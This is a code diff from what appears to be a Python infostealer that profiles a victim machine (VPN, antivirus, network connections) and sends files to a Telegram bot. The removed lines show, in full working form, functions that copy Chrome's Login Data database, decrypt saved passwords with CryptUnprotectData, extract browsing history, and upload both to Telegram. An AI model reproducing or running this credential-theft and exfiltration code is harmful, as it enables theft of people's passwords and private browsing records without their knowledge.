@@ -263,67 +263,6 @@ def get_active_connections(limit=10):
             connections.append(f"{laddr} → {raddr} ({conn.status})")
     return connections[:limit] if connections else ["No active connections"]
 
-# Function to save decrypted Chrome passwords to a .txt file
-def save_chrome_passwords_to_file(limit=10):
-    login_db_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
-    temp_copy = "LoginData_temp"
-    try:
-        # Copy the Login Data file to avoid file access errors
-        shutil.copy2(login_db_path, temp_copy)
-
-        # Connect to the copied database
-        conn = sqlite3.connect(temp_copy)
-        cursor = conn.cursor()
-
-        # Execute the query to get saved passwords
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-
-        file_path = "chrome_passwords.txt"
-        with open(file_path, 'w') as file:
-            # Loop through each saved login and decrypt the password
-            for row in cursor.fetchall()[:limit]:
-                url, username, encrypted_password = row
-                try:
-                    # Decrypt the password using CryptUnprotectData
-                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
-                    # Write the decrypted password to the file
-                    file.write(f"🔐 URL: {url}\n👤 Username: {username}\n🔑 Password: {password}\n\n")
-                except Exception as e:
-                    # In case of decryption failure, log the failure message
-                    file.write(f"🔐 URL: {url}\n👤 Username: {username}\n🔑 [Decryption Failed] {str(e)}\n\n")
-
-        # Close the database connection and remove the temporary file
-        conn.close()
-        os.remove(temp_copy)
-        return file_path
-    except Exception as e:
-        return f"Failed to get Chrome passwords: {e}"
-
-def save_chrome_history_to_file(limit=10):
-    try:
-        history_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
-        temp_copy = "History_temp"
-        shutil.copy2(history_path, temp_copy)  # Avoid locking issues
-
-        conn = sqlite3.connect(temp_copy)
-        cursor = conn.cursor()
-
-        cursor.execute("""
-            SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?
-        """, (limit,))
-        
-        file_path = "chrome_history.txt"
-        with open(file_path, 'w') as file:
-            for url, title, visit_time in cursor.fetchall():
-                visit_dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=visit_time)
-                file.write(f"🔗 {title or '[No Title]'}\n🌍 {url}\n🕓 {visit_dt.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
-
-        conn.close()
-        os.remove(temp_copy)
-        return file_path
-    except Exception as e:
-        return f"Failed to retrieve Chrome history: {e}"
-
 # Function to send the file to Telegram
 def send_file_to_telegram(bot_token, chat_id, file_path, caption=""):
     try:
@@ -360,18 +299,6 @@ if __name__ == "__main__":
     vpn_info = detect_vpn_proxy()
     av_info = get_antivirus_software()
     active_conns = get_active_connections()
-    # Save history and passwords to files
-    history_file = save_chrome_history_to_file()
-    passwords_file = save_chrome_passwords_to_file()
-    # Save passwords to a file and send it
-    passwords_file = save_chrome_passwords_to_file()
-
-    # Send the passwords file to Telegram
-    send_file_to_telegram(bot_token, chat_id, passwords_file, "🔐 Decrypted Chrome Saved Passwords")
-
-    # Send files to Telegram
-    send_file_to_telegram(bot_token, chat_id, history_file, "📜 Chrome Browsing History")
-    send_file_to_telegram(bot_token, chat_id, passwords_file, "🔐 Chrome Saved Passwords")
 
 
 
